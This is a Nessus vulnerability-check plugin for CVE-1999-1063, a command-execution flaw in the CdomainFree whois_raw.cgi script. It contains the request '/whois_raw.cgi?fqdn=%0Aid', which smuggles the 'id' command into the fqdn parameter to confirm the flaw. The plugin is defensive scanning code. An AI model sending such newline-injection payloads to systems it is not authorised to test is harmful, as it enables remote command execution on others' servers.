#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10306);
 script_version ("$Revision: 1.42 $");
 script_cve_id("CVE-1999-1063");
 script_bugtraq_id(304);
 script_osvdb_id(242);
 
 script_name(english:"CDomain whois_raw.cgi fqdn Parameter Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is prone to arbitrary
command execution attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using the CdomainFree 'whois_raw.cgi'
script. 

This CGI script allows an attacker to view any file on the target
computer, as well as to execute arbitrary commands." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9160cb71" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to CdomainFree 2.5 or to one of the commercial versions." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/06/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/06/01");
 script_cvs_date("$Date: 2011/03/15 19:26:57 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_summary(english:"Checks if whois_raw.cgi is vulnerable");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 1999-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
  http_check_remote_code(
    unique_dir:dir,
    check_request:string("/whois_raw.cgi?fqdn=%0Aid"),
    check_result:"uid=[0-9]+.*gid=[0-9]+.*",
    command:"id",
    port:port
  );
}
